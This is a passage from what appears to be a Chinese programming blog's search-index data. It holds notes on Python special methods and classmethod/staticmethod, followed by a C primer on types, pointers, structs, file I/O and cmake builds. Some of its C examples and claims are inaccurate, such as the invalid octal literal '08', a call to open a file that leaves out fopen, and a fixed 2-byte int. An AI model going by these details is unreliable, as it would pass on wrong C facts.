对一个属性赋值时 _delattr_(self, name) del self.name 删除一个属性时 _getattribute_(self, name) self.name 访问任何属性时 _getitem_(self, key) self[key] 使用索引访问元素时 _setitem_(self, key, val) self[key] = val 对某个索引值赋值时 _delitem_(self, key) del self[key] 删除某个索引值时 _iter_(self) for x in self 迭代时 _contains_(self, value) value in self, value not in self 使用 in 操作测试关系时 _concat_(self, value) self + other 连接两个对象时 _call_(self [,…]) self(args) “调用”对象时 _enter_(self) with self as x: with 语句环境管理 _exit_(self, exc, val, trace) with self as x: with 语句环境管理 _getstate_(self) pickle.dump(pkl_file, self) 序列化 _setstate_(self) data = pickle.load(pkl_file) 序列化 内部完整文档可以参考 官方 ","date":"2019-11-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/python%E6%8A%80%E5%B7%A7-%E7%B1%BB/:2:3","series":null,"tags":["blog","python"],"title":"python技巧-类","uri":"/posts/%E7%AC%94%E8%AE%B0/python%E6%8A%80%E5%B7%A7-%E7%B1%BB/#特殊的内部函数"},{"categories":["blog"],"content":" 类方法和静态方法classmethod 通常用来创造此类的实例。例如你需要通过别人的参数，来创造一个实例。但是参数可以包括对象、json 等。 好处: 简单且逻辑直观。 不需要实例化就可以使用。 还可以在内部调用静态方法。完整复杂的操作。 staticmethod 是为了解决各种尴尬的问题。当你需要一个通用的 Tools 类时，内部都写成静态方法是不错的选择。 可能遇到的尴尬之处: 写做外部方法，但不够通用。 作为内部普通方法，却想不需要实例化就使用。 和类方法对比起来。却又不需要和类对象有任何关系。 ","date":"2019-11-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/python%E6%8A%80%E5%B7%A7-%E7%B1%BB/:3:0","series":null,"tags":["blog","python"],"title":"python技巧-类","uri":"/posts/%E7%AC%94%E8%AE%B0/python%E6%8A%80%E5%B7%A7-%E7%B1%BB/#类方法和静态方法"},{"categories":["blog"],"content":" 好的技巧资料","date":"2019-11-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/python%E6%8A%80%E5%B7%A7-%E7%B1%BB/:4:0","series":null,"tags":["blog","python"],"title":"python技巧-类","uri":"/posts/%E7%AC%94%E8%AE%B0/python%E6%8A%80%E5%B7%A7-%E7%B1%BB/#好的技巧资料"},{"categories":["blog"],"content":" Python Cookbook","date":"2019-11-26","objectID":"/posts/%E7%AC%94%E8%AE%B0/python%E6%8A%80%E5%B7%A7-%E7%B1%BB/:4:1","series":null,"tags":["blog","python"],"title":"python技巧-类","uri":"/posts/%E7%AC%94%E8%AE%B0/python%E6%8A%80%E5%B7%A7-%E7%B1%BB/#python-cookbookhttpspython3-cookbookreadthedocsiozh_cnlatest"},{"categories":["blog"],"content":"之前在一些文章里面就有说过。程序员是绕不过JavaScript的，即使有时候会恶心到人。。而很多硬件的嵌入式开发，算法工程师，底层开发人员则真的可以做一辈子，而免疫JavaScript的侵扰。而JavaScript的每一个改动，都多多少少与c/c++有关。可以说大神们用c/c++构建了现在数字化的底层逻辑。比c更底层的，晦涩难懂且开发效率低下，甚至人写的代码经常不如c编译器优化后的代码。比c高级的，性能下降且概念繁多。和c同级别的，都没有c混得好。c是事实标准","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/"},{"categories":["blog"],"content":" 前言如果你从来没有了解过编程，而想学习 c。那么去搜新手教程慢慢上手。 如果你有其他编程的基础。这篇文章能用来让你快速了解 c 代码。可以在你不得不去看 c 代码的时候，看懂他的意图。 之前在一些文章里面就有说过。程序员是绕不过 js 的，即使有时候会恶心到人。。 而很多硬件的嵌入式开发，算法工程师，底层开发人员则真的可以做一辈子，而免疫 JavaScript 的侵扰。而 JavaScript 的每一个改动，都多多少少与 c/c++ 有关。 可以说大神们用 c/c++ 构建了现在数字化的底层逻辑。比 c 更底层的，晦涩难懂且开发效率低下，甚至人写的代码经常不如 c 编译器优化后的代码。比 c 高级的，性能下降概念繁多。和 c 同级别的，都没有 c 混得好。事实上 c 是事实标准。 ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:1:0","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#前言"},{"categories":["blog"],"content":" 基本了解","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:2:0","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#基本了解"},{"categories":["blog"],"content":" 类型二进制的 c 表达，需要用代码实现 # python用0b开头 a = 0b101 八进制 // c用0开头 int a = 08 # python用0o开头 数字0和字母o a = 0o516 十六进制 // c用0x开头 int a = 0x2A # python用0x开头 a = 0x2A 其中 int 是 2 个字节。long int 是 4 个字节。 而 float 是 4 个字节。double 是 8 个字节。long double 是 16 个字节。注意在计算的时候，可能存在舍入误差。 char 一个字符一个字节。 字符串则会比 char 多出来一个尾部的 \\0 字节。 unsigned 则代表没有符号位。例如 int 类型前面都会有一个符号位。没有符号位则会扩大 int 的可存储范围 附带补充一点知识。 数组 int a[10]; // 10个长度，空位补0 int b[10]={1,2,3,4,5}; // 自动检测到长度 int b[]={1,2,3,4,5}; 而字符串就这样表示 // 长度会是4，因为后面还有一个\\0 char c[]=\"C a\"; 说几个常用的字符串函数吧 strcat 合并 strcpy 拷贝 strcmp 比较 strlen 拿到字符串长度 ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:2:1","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#类型"},{"categories":["blog"],"content":" 函数部分 函数其实没什么好说的。记得除了库函数 (自带标准库),都要定义一下。才能用。 全局变量默认在静态存储区。 加了 static 的局部变量也在静态存储区。 register 的变量会放在寄存器，会提高性能。 外部变量用 extern 声明，则可以在代码中使用。 ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:2:2","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#函数部分"},{"categories":["blog"],"content":" 预处理命令 #define PI 3.1415 用 PI 替代代码中的 3.1415。#undef PI 取消。 // 可以带参数。 #define SQ(y) (y)*(y) /* 但注意扩起来。否则可能结果有误 */ /* 例如sq=SQ(a+1)会变成sq=a+1*a+1 */ #include \"stdio.h\" 引入头文件。一般都用双引号先从当前目录查找。 #ifdef #else #endif 用来判断执行。#if 则非 0 则为 true。 ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:2:3","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#预处理命令"},{"categories":["blog"],"content":" 指针示例代码 // 声明int变量a和int指针*p int a,*p; a=10; // 把a的地址给p p=\u0026a; // 现在用*p即可取到a的值 printf('%d',*p); 指针如果指向数组，则默认指向数组的第一个元素。可以通过 *(p+1) 取到第二个元素的值。字符串同理。 函数也是占用连续的内存段。则 int (*pf)(); 代表指向一个返回值是 int 的函数。当指针赋值后，通过 (*pmax)(a) 调用。 int *ap(int x,int y) 代表返回指针。 语法 说明 int i; 定义整型变量 i int *p; p 为指向整型数据的指针变量 int a[n]; 定义整型数组 a，它有 n 个元素 int *p[n]; 定义指针数组 p，它由 n 个指向整型数据的指针元素组成 int (*p)[n]; p 为指向含 n 个元素的一维数组的指针变量 int f(); f 为带回整型函数值的函数 int *p(); p 为带回一个指针的函数，该指针指向整型数据 int (*p)(); p 为指向函数的指针，该函数返回一个整型值 int **p; P 是一个指针变量，它指向一个指向整型数据的指针变量 优先级为：()\u003e[]\u003e*。然后从左往右看。 ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:2:4","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#指针"},{"categories":["blog"],"content":" 结构体如果你理解了前面所说的指针，那么指针就会很好理解。其实就是一系列的基本类型放在一个连续的内存段中。 // 声明一个结构体 struct human { int num; char name[20]; char sex; }; // human结构的变量 struct human { int num; char *name; char sex; }boy; // 5个human结构组成的数组变量 struct human { int num; char *name; char sex; }boy[5]; // 带上初始化的值 struct human { int num; char *name; char sex; }boy[5]={ {101,\"Li ping\",'M'}, {102,\"Zhang ping\",'M'}, {103,\"He fang\",'F'}, {104,\"Cheng ling\",'F'}, {105,\"Wang ming\",'M'}, }; 取值赋值:boy.num 数组类似普通数组:boy[i].num 指针:struct human *ph 指针取值:ph-\u003enum 或 (*ph).num ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:2:5","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#结构体"},{"categories":["blog"],"content":" 动态分配很多时候不确定需要多大空间的时候，通过传参来实现。 // 分配一个100字节长度字符数组，pc为指向这个字符数组 pc=(char *)malloc(100); // 分配2个struct human结构体的长度。ps为指针且指向这个数组 ps=(struet human*)calloc(2,sizeof(struct human)); // 接收指针变量，释放它 free(pc); free(ps); ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:2:6","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#动态分配"},{"categories":["blog"],"content":" typedef用 typedef 加在 struct 前面，变量名写 HUMAN，就可以用 HUMAN h1,h2 来声明变量了！简洁明了。 typedef int INTEGER; INTEGER a,b; typedef char NAME[20]; // 在和预定义不同的是，这是在编译器进行的。 NAME a1,a2,s1,s2; // 等效 char a1[20],a2[20],s1[20],s2[20] ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:2:7","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#typedef"},{"categories":["blog"],"content":" 位运算位运算方面其实和其他语言的区别不大。看到应用最多的地方是权限方面的。自己对着文档看吧。我反正是觉得不好理解，不爱用。 ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:2:8","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#位运算"},{"categories":["blog"],"content":" 文件操作其实到了文件操作部分，就开始用前面学到的知识来进行延伸了。 File *fp; 声明一个指针变量，文件类型。这并不是一个特殊的语法。我的 mac 上可以看到定义，是一个结构体。 typedef struct __sFILE { unsigned char *_p; /* current position in (some) buffer */ int _r; /* read space left for getc() */ int _w; /* write space left for putc() */ short _flags; /* flags, below; this FILE is free if 0 */ short _file; /* fileno, if Unix descriptor, else -1 */ struct __sbuf _bf; /* the buffer (at least 1 byte, if !NULL) */ int _lbfsize; /* 0 or -_bf._size, for inline putc */ /* operations */ void *_cookie; /* cookie passed to io functions */ int (* _Nullable _close)(void *); int (* _Nullable _read) (void *, char *, int); fpos_t (* _Nullable _seek) (void *, fpos_t, int); int (* _Nullable _write)(void *, const char *, int); /* separate buffer for long sequences of ungetc() */ struct __sbuf _ub; /* ungetc buffer */ struct __sFILEX *_extra; /* additions to FILE to not break ABI */ int _ur; /* saved _r when _r is counting ungetc data */ /* tricks to meet minimum requirements even when malloc() fails */ unsigned char _ubuf[3]; /* guarantee an ungetc() buffer */ unsigned char _nbuf[1]; /* guarantee a getc() buffer */ /* separate buffer for fgetln() when line crosses buffer boundary */ struct __sbuf _lb; /* buffer for fgetln() */ /* Unix stdio files get aligned to block boundaries on fseek() */ int _blksize; /* stat.st_blksize (may be != _bf._size) */ fpos_t _offset; /* current lseek offset (see WARNING) */ } FILE; fp=(\"/home/a.txt\",\"r\"); 只读方式打开制定文件，后面的参数类似 python。 ch=fgetc(fp); 取第一个字符赋值给 ch。 fputc('a',fp); 弄一个字符串到到指针位置。 fgets(str,n,fp); 从 fp 中取 n-1 个字符 (即字符串) 到 str 这个 char 数组中。为什么是 n-1(一般也是 str 长度 -1)，因为字符串后面要有一个 ‘\\0’ 啊！ 它读取到换行符或者文件结尾会停止。 str 这个数组我试过几个不同的大小。发现 4096(4k) 是一个门槛，小于它可能会影响性能。而我看到 python 默认使用的是系统 buffer 大小 8192(8k 即 2 个 block)。现在的文件系统多数都是 4k 为一个 block，而 io 一般最少存取一个 block。那么设置成 2 个 block，也有助于更快的对下一个 block 数据块进行操作，而更大的话就没有太大意义了，可能会浪费磁盘 io 导致占用过多的资源。 fputs(“abcd“,fp); 把字符串放到指针位置。这里传递的是字符串，其实传递的就是字符数组首地址。所以如果是 char *b=“abcd” 要进行传递，直接传递 fputs(b,fp) 即可！ fread(qq,sizeof(struct stu),2,fp);qq 是一个指针，表示数据的首地址 (在这里指向一个 stu 结构体)，qq+1 会移动到第二个 stu 结构体。第二个是数据块的大小,第三个是读取几个数据块，fp 是文件指针。 fwrite(qq,sizeof(struct stu),2,fp); 参数同上，只不过是写数据。 fscanf(fp,\"%d %s\",\u0026i,s); 和 fprintf(fp,\"%d %c\",j,ch); 用来通过第二个参数指定的方式，存放或者打印数据。主义第二个参数中的空格也是会生效的！ rewind 函数把文件指针重新指向头部。 fseek(fp,100L,0); 类似 python 的指针偏移。0 文件首地址，1 当前位置，2 文件末尾。常量表示偏移量必须带上 ‘L’。移动到离文件首 100 字节距离的位置。也可以直接填写数字。负号前移，正号后移。 最后说明EOF 是一个隐藏字符。在读取完了数据以后，才会遇到 EOF。 而 feof() 是通过返回错误来判断是否结束。所以需要先取值，后判断。遇到了 EOF(即 -1) 就会出错。停止下一个循环。 0 是 false，非 0 位 true。 ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:2:9","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#文件操作"},{"categories":["blog"],"content":" 编译简单来说，编译就是使用 gcc,make,cmake 等工具来进行的。 如果使用 vs 或者 clion 这样的工具，需要了解的是工具的使用方法。而下面我要简单说明的是手工编译。 在项目目录下新建 build 文件夹。 进入 build 文件夹使用 cmake .. 生成 Makefile 运行 make 命令编译成功，找到输出文件即可。 ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:3:0","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#编译"},{"categories":["blog"],"content":" linux我在 centos7 上运行 gcc,make,cmake 都可以正常使用。 ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:3:1","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#linux"},{"categories":["blog"],"content":" mac用 brew 安装 cmake 后，也可以跑通。 ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:3:2","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#mac"},{"categories":["blog"],"content":" windows我是用的 scoop 安装 cmake。 然后安装最新的 vs。下载 mingw-get，然后安装 mingw32-make。 cmake -G \"MinGW Makefiles\" . # .为当前目录, \"MinGW Makefiles\"为makefile类型，如果编译器为vs的话使用\"NMake Makefiles\" 看到了 Makefile 后 mingw32-make 即可。 ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:3:3","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#windows"},{"categories":["blog"],"content":" 难点记录一下难以理解的地方。 ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:4:0","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#难点"},{"categories":["blog"],"content":" 指针数组和数组指针在看书的时候，了解到 main 函数可以接受 2 个参数。而 main 函数不能被其他函数调用 (有一些编译器不管你这么多，也能编译通过。但是制定标准的委员会明确表明了不行)。 int argc 代表单数的个数。包括程序自己本身。 char *argv[] 代表一个指向字符串的指针数组。 先说一下我之前的错误想法吧。 一个指针数组。那么我拿到的就是一个数组。 那么我应该先用 argv[i] 拿到数组中的第 i 个指针。然后如何取值呢？用 *(argv[i]) 取第一个值。可是报错了。 那么我的理解错误在哪呢？下面用 ./helloworld a=1 来举例。 ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:4:1","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#指针数组和数组指针"},{"categories":["blog"],"content":" 第一点，c 中没有字符串类型。字符串是由字符数组组成，以\\0 结尾。字符串又有 2 个声明的方式。 //可以修改指针的地址，但是无法修改原有的值。存储在内存只读段。只要程序在运行，那么就不会释放。 char *a=\"hehe\"; //可以修改。在函数内接收，用完就会释放掉。 char b[]=\"hehe\"; c 是如何读取字符串的呢？ 在 c 语言中，指向字符和指向字符串的区别只是在于取值，根本就没有指向字符串的指针。从字符串 (字符数组) 的首地址开始取值，一直到\\0 结束，那么这个字符串就读完了。 于是根据例子，系统传递给 main 函数的就是 2 个字符数组。也就变成了传递 1 个包含有 2 个 char* 类型指针的指针数组即可。取第 n 个值，就从数组中第 n 个指针所指向的地址取值到\\0 即可。 所以 printf(\"%s\",*a) 中。*a 取到的值 ‘h’。而 printf 中指明了要取一个字符串。所以它打印的结果会一直读到\\0 才会停止。 ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:4:2","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#第一点c-中没有字符串类型字符串是由字符数组组成以0-结尾字符串又有-2-个声明的方式"},{"categories":["blog"],"content":" 第二点，要彻底了解的是数组作为参数的传递。 我的 main 会得到一个长度为 2 的数组。如果用户还输入了 b=2，c=3 呢？我的的程序是无法预测到用户参数的具体个数。所以 main 函数无法写死数组长度，所以还会有一个 int argc 参数告诉我才行。 数组在传递的时候，传递的只是首地址。用一小段代码来理解一下发生了什么。 void test3(int ac,char av[]){ printf(\"%p\\n\",av); for (int i = 0; i \u003c ac; ++i) { printf(\"%c\",av[i]); } } void test4(char a){ printf(\"%p\\n\",\u0026a); } void test5(char *qt[]){ printf(\"%p\\n\", qt); } int main(int argc, char *argv[]) { char p='p'; printf(\"%p\\n\",\u0026p); test4(p); char pch[] = \"pch\"; printf(\"%p\\n\", pch); test3(strlen(pch), pch); char *qq[]={\"q\",\"w\"}; char **qq2=qq; printf(\"%p\\n\", qq); test5(qq); return 0; } // 结果 // 0x7ffee0afc77f // 0x7ffee0afc75f // 0x7ffee0afc77b // 0x7ffee0afc77b // pch // 0x7ffee81d0770 // 0x7ffee81d0770 先看 test3 和 test4 的结果。 可以发现 2 个变量的数据存在不同的内存区域，char 类型传递的是 具体值，也就是给形参 a 赋值。也即是我在 test4 中修改 a 的值，不会影响到 p 的值。 test3 中 2 个变量的数据为同一内存区域，数组类型传递的是 值的地址，也就是让 av 也指向 pch 所指向的地方，于是相同的地址指向同一个值。当我使用 *av 修改值，对应的 pch 值也会变动。 而通过打印，我们会知道。地址指向字符串 (字符数组) 第一个 char。可以用 *av 直接取值。 C 语言规定，数组名代表数组的首地址，也就是第 0 号元素的地址。说明我们在声明了 pch 以后，就可以把数组名 pch 看成是一个指针。 那么我们在 test3 函数中，形参也可以写成 char *av(你可以验证看)。 再看 test5 的结果。发现地址也是一样的。 同理就可以推断出，传递的是地址，所以 qt 是指针类型。根据结果，指针数组传递的就是第一个指针所指向值的地址。直接 *qt 即可取值。 前面在传递数组的时候，数组名代表着一个指针。同样在传递指针数组的时候，数组名就是第一个元素的地址，而第一个元素是指针。所以数组名 qt 是指针的指针！ 那么我们在 test5 函数中，形参也可以写成 char **qt(char **qq2=qq 也侧面验证了 char**类型 接收数组变量名 qq)。这也是为什么 main 函数中 char *argv[] 也可以写的 char **argv 的原因了！ 得到结论：数组在传递的时候，形参 char* 和 char[] 等效。char**与 char *[] 等效。 同时也说明，数组 [i] 只不过是指针的一个语法糖，相当于 *(指针 +i)。 所以取值如下： char **qt 强调自己是指针。取值常用 **qt。 char *qt[] 强调自己是数组。取值常用 qt[0]。 虽然你的形参是 char **qt 也可以用 qt[0] 取值。但是不方便理解，且容易出错。 // 你的第一感觉应该是用**rrr取值。 char r='a'; char *rr=\u0026r; char **rrr=\u0026rr; // 下面报错 printf(\"%d\\n\",rrr[0]); // 说明要分情况的，char **qt不等同于char *qt[] ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:4:3","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#第二点要彻底了解的是数组作为参数的传递"},{"categories":["blog"],"content":" 第三点，再来说一下我自己理解错误。由于之前所接触到的语言，基本的逻辑都是面向对象且没有指针。都是值传递，而不是地址传递。 写过一篇 go 语言的文章，可我没有深入了解过它的指针。经过翻查，发现 go 在数组传递的时候也是值传递。在 go 中，指针是为了减少性能开销存在的。而很少见到有人做指针运算。 而 c 的指针贯穿了整个语言。在进行值传递的时候，形参可以拿到所有信息，因为要进行赋值操作。值传递会让变量名直接取到值。 而地址传递只有一个地址和类型，需要用到取值符 *。且在一个指针指向数组的时候 *p 和 p[0] 等价。 只有搞清楚传递的过程中是值还是地址，才能正确的分析问题。 ","date":"2019-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/:4:4","series":null,"tags":["blog","c"],"title":"起码要能看懂c系列的代码","uri":"/posts/%E7%AC%94%E8%AE%B0/%E8%B5%B7%E7%A0%81%E8%A6%81%E8%83%BD%E7%9C%8B%E6%87%82c%E7%B3%BB%E5%88%97%E7%9A%84%E4%BB%A3%E7%A0%81/#第三点再来说一下我自己理解错误"},{"categories":["blog"],"content":" 